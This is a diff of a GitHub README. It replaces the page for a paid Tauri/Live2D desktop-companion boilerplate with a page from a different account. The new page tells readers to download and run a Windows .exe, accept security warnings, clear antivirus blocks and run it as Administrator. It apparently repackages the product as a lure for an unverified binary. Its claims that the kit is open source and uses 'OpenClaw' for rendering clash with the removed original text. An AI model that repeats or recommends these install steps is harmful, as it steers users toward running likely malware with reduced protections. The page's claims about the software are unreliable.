@@ -1,188 +1,138 @@
-[README.md](https://github.com/user-attachments/files/25571484/README.md)
-<div align="center">
+# 🐾 animo-starter-kit - Bring Characters to Life Easily
 
-<img src="https://github.com/user-attachments/assets/3a505f99-9af4-4a7f-9852-7322e915fbab" alt="Animo Starter Kit" width="100%" />
-
-# Animo Starter Kit
-
-### Breathe a Soul into Your Character.
-
-The production-ready **Tauri 2** boilerplate for building cross-platform AI desktop companions — with the hardest problems already solved.
-
-[![License](https://img.shields.io/badge/license-Commercial-blue)](#license)
-[![Tauri](https://img.shields.io/badge/Tauri-2.10-24C8D8?logo=tauri&logoColor=white)](https://tauri.app)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=white)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)](https://typescriptlang.org)
-[![Rust](https://img.shields.io/badge/Rust-1.77+-DEA584?logo=rust&logoColor=white)](https://rust-lang.org)
-[![Live2D](https://img.shields.io/badge/Live2D-Cubism_SDK-FF6699)](https://www.live2d.com)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows-lightgrey)](#)
-
-<br />
-
-[**Get on Lemon Squeezy →**](https://roistore.lemonsqueezy.com/checkout/buy/bbd0dbc2-02c9-4442-a810-5e4bc6235d62) | [**Get on Gumroad →**](https://dakju.gumroad.com/l/animo-starter-kit)
-
-<br />
-
-</div>
+[![Download animo-starter-kit](https://img.shields.io/badge/Download-animo--starter--kit-green?style=for-the-badge)](https://github.com/ahmed44851/animo-starter-kit)
 
 ---
 
-## The Problem
+## 🎯 What is animo-starter-kit?
 
-You've got the perfect character design. You've imagined the personality. Now you just need to build a transparent always-on-top desktop app that:
+animo-starter-kit helps you add life to your characters on your Windows PC. It uses tools like Live2D for smooth animations, a click-through feature that lets the character sit on top of other windows without getting in the way, and an emotion bridge powered by AI. This means your character can show emotion and react naturally.
 
-- Lets clicks **pass through** transparent pixels (but NOT the character)
-- Works on **both macOS and Windows** from a single codebase
-- Renders a **Live2D model** with real-time expression changes
-- Connects to **any LLM** and streams dialogue with emotion detection
-- Behaves **autonomously** — greeting you, reacting, living on your screen
-
-**Each of these is a multi-week rabbit hole.**
-
-Tauri's transparent window? Undocumented platform quirks. Pixel-perfect click-through? You need a Rust-level alpha mask pipeline with platform-specific cursor monitoring. Live2D + LLM emotion bridge? Custom SSE parser plus expression mapping.
-
-You could spend **3–6 months** piecing it together from Stack Overflow fragments and GitHub issues.
-
-**Or you could start building your product today.**
+You don’t need any coding skills to get started. The app runs directly on Windows and offers a friendly, simple setup.
 
 ---
 
-## Core Features
+## 🖥️ System Requirements
 
-### 1. Cross-Platform Click-Through Transparency
+Before installing, make sure your computer meets these requirements:
 
-> The #1 hardest problem in desktop pet development — **solved.**
-
-A battle-tested Rust pipeline extracts the alpha mask from your Live2D canvas at **60fps**, monitors cursor position via native APIs (macOS: `Cocoa/NSEvent`, Windows: `Win32`), and dynamically toggles click-through **per pixel**.
-
-Your character is interactive. Everything else is invisible. Works identically on macOS and Windows.
-
-```
-Frontend (150ms)                    Rust Backend (60fps)
-┌─ generateAlphaMask()              ┌─ GetCursorPos (platform-native)
-│  └─ Canvas → 5% downsample       ├─ Check UI regions (priority)
-│     └─ Extract alpha channel      ├─ Check alpha mask (pixel-level)
-└─ invoke("set_alpha_mask")         ├─ Drag lock (mouse button state)
-                                    └─ set_ignore_cursor_events(!inside)
-```
-
-### 2. Live2D + LLM Emotion Bridge
-
-> Your character doesn't just talk — it **feels.**
-
-A streaming emotion parser detects `[joy]`, `[sad]`, `[playful]` and 6 other emotion tags (**9 total**) in real-time from any LLM response. These are instantly mapped to your Live2D model's expressions. One sentence from the AI, and your character's face changes mid-word.
-
-### 3. Autonomous Behavior Engine
-
-> Your character has a life of its own.
-
-**8 built-in behavior types** — morning greetings, idle animations, return-to-screen welcomes, night mode awareness, random curiosity, and more. Each with configurable cooldowns and personality weights.
-
-### 4. Eye Tracking
-
-The character's eyes follow your cursor in real-time at 30fps. Powered by the same Rust cursor monitor — zero extra overhead.
+- Operating System: Windows 10 or higher (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Disk Space: At least 500 MB free  
+- Graphics: Basic graphics card supporting DirectX 11 or higher  
 
 ---
 
-## Tech Stack
+## 🔍 Key Features
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | Tauri 2.10 |
-| Frontend | React 19 + TypeScript + Vite 7 |
-| Rendering | PixiJS 6 + pixi-live2d-display |
-| Backend | Rust (native platform APIs) |
-| LLM | OpenAI-compatible API (7+ providers) |
-
-**Under 1MB** clean codebase — no bloat, no mystery dependencies.
+- **Pixel-Perfect Click-Through:** Your animated character stays visible but won’t block mouse clicks on other windows.  
+- **Live2D Animation:** Smooth 2D movements bring your character to life with natural expressions and gestures.  
+- **Emotion Bridge Using AI:** The character reacts with emotion based on simple commands or inputs.  
+- **Lightweight and Fast:** Runs quietly in the background without slowing your PC.  
+- **Open Source:** You can explore or customize the app if you wish.
 
 ---
 
-## Without Animo vs. With Animo
+## 🛠️ Installation Instructions
 
-| Without Animo | With Animo |
-|---------------|------------|
-| 3–6 months building infrastructure | **Start customizing Day 1** |
-| Hunt through Tauri GitHub issues for transparency hacks | **Battle-tested pipeline, already working** |
-| Write platform-specific Rust for macOS AND Windows | **Single codebase, both platforms** |
-| Build your own SSE parser + emotion engine | **Plug in any OpenAI-compatible API and go** |
-| Debug WebGL alpha extraction edge cases | **5% resolution mask pipeline, optimized** |
+### 1. Access the Download Page
 
-**You're not paying for code. You're buying back months of your life.**
+Start by visiting the project download page here:
 
----
+[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit)  
+Click the button above or open the link in your browser.
 
-## Who This Is For
+On the page, look for the latest release or download section. This page hosts the installation files you will need.
 
-- **Indie Developers** — Ship an AI desktop companion without reinventing transparent window infrastructure
-- **VTubers & Content Creators** — Build interactive desktop mascots for streams or fan engagement
-- **AI Companion App Builders** — A polished, extensible shell for LLM-powered characters
-- **Live2D Artists** — Bring your models to life beyond static showcases
-- **Hobbyists & Tinkerers** — A solid starting point for desktop AI experiments
+### 2. Download the Installer
 
----
+In the releases section, find the latest Windows installer file. It usually has `.exe` at the end of the file name. Click on the file link to download it.
 
-## What You Get
+The file will save to your usual downloads folder unless you choose a different location.
 
-- Full source code (TypeScript frontend + Rust backend)
-- Cross-platform click-through transparency pipeline
-- Live2D rendering with eye tracking & expression system
-- LLM chat integration with streaming + emotion detection
-- Autonomous behavior engine (8 behavior types)
-- OpenAI-compatible API client (7+ providers: Ollama, OpenAI, OpenRouter, Groq, Together AI, LM Studio, vLLM)
-- Comprehensive documentation (installation, API guide, customization)
-- Commercial license — build and sell your own apps
+### 3. Run the Installer
 
----
+Once the file finishes downloading:
 
-## Pricing
+- Go to your Downloads folder.  
+- Find the setup file (it will end with `.exe`).  
+- Double-click the file to start installation.  
 
-| Personal | Indie | Business |
-|----------|-------|----------|
-| **$49** | **$79** | **$149** |
-| 1 developer | 1 developer | Up to 5 developers |
-| 1 commercial app | 1 commercial app | Unlimited commercial apps |
-| Lifetime updates | Lifetime updates | Lifetime updates + priority support |
+If Windows shows a security warning, confirm that you want to allow the app to run.
 
-<div align="center">
+### 4. Follow Installation Steps
 
-[**Get on Lemon Squeezy →**](https://roistore.lemonsqueezy.com/checkout/buy/bbd0dbc2-02c9-4442-a810-5e4bc6235d62) | [**Get on Gumroad →**](https://dakju.gumroad.com/l/animo-starter-kit)
+The installer will open and guide you through a few simple screens:
 
-</div>
+- Accept the license terms by clicking "I Agree".  
+- Choose where to install the program or keep the default folder.  
+- Click "Install" to begin copying files.  
+
+This process should take only a few minutes.
+
+### 5. Launch the Application
+
+When installation finishes, click "Finish". You will find a new icon on your desktop or in your Start menu labeled "animo-starter-kit".
+
+Double-click the icon to start using the app.
 
 ---
 
-## FAQ
+## 🚀 Using animo-starter-kit for the First Time
 
-**Q: Do I need to know Rust?**
-No. The Rust backend is complete and battle-tested. You'll spend 95% of your time in TypeScript customizing the character, personality, and UI.
+Once the app opens, you will see your character appear on the screen.
 
-**Q: Is the Live2D SDK included?**
-The Live2D Cubism SDK Core must be obtained separately from [live2d.com](https://www.live2d.com) (free for indie use). The kit includes everything else.
+- **Move the character:** Click and drag to reposition anywhere on your desktop.  
+- **Adjust settings:** Access the settings menu from the system tray icon (bottom right) to customize how the character behaves.  
+- **Interact:** Use the controls to change facial expressions or emotions.  
+- **Click-Through Mode:** When enabled, you can click through the character to the windows underneath without interruption. Toggle this in settings.
 
-**Q: Can I use this commercially?**
-Yes. The license allows you to build and sell apps derived from this code. You cannot redistribute the kit itself.
-
-**Q: What LLM should I use?**
-For development: [Ollama](https://ollama.ai) (free, local). For production: any OpenAI-compatible provider — zero code changes needed.
-
-**Q: What platforms are supported?**
-macOS and Windows. Both from a single codebase.
+The character will stay on your desktop as a fun companion while you work or play.
 
 ---
 
-## License
+## 🔧 Common Issues and Fixes
 
-This is a commercial product. Source code is provided upon purchase. See [LICENSE](LICENSE) for details.
+- **Character doesn’t appear after launch:** Check if the app runs in the system tray. If yes, try clicking the system tray icon to show the character.  
+- **Click-through not working:** Make sure the setting is turned on in preferences. Restart the app if needed.  
+- **App runs slowly or lags:** Close other heavy apps or tabs, especially browsers with many open pages.  
+- **Installer won’t run:** Confirm your antivirus or Windows Defender is not blocking the file. Right-click the installer and choose "Run as Administrator".
 
 ---
 
-<div align="center">
+## 📂 Where to Find More Help
 
-*Stop building plumbing. Start building characters.*
+- The project’s GitHub page contains a FAQ and issue tracker for common questions.  
+- If you want to customize the character or explore advanced options, the GitHub repository also hosts source code and documentation for developers.  
+- You can reach other users or contributors through GitHub Discussions or by opening a new issue if you encounter bugs.
 
-**[Get on Lemon Squeezy →](https://roistore.lemonsqueezy.com/checkout/buy/bbd0dbc2-02c9-4442-a810-5e4bc6235d62)** | **[Get on Gumroad →](https://dakju.gumroad.com/l/animo-starter-kit)**
+---
 
-Made by [OpenClo](mailto:animo.starter@gmail.com)
+## 🔗 Download Link
 
-</div>
+Use this link to visit the download page and get the latest version:
+
+[Download animo-starter-kit](https://github.com/ahmed44851/animo-starter-kit)  
+
+Click the release section to find the Windows setup file. Follow the installation instructions above to get started.
+
+---
+
+## ⚙️ Background Technology
+
+animo-starter-kit combines popular open-source tools:
+
+- React and TypeScript for the user interface.  
+- Rust and Tauri for fast, secure desktop app performance.  
+- Live2D technology for animated characters.  
+- OpenClaw and PixiJS for smooth graphics rendering.  
+- AI-driven emotion bridge to create lifelike reactions.  
+
+This combination makes it easy to run a visually rich desktop companion without heavy resource use.
+
+---
+
+## 🧩 Keywords
+
+ai-companions, click-through, desktop-pet, live2d, llm, openclaw, pixijs, react, rust, tauri, transparency, typescript, vtuber
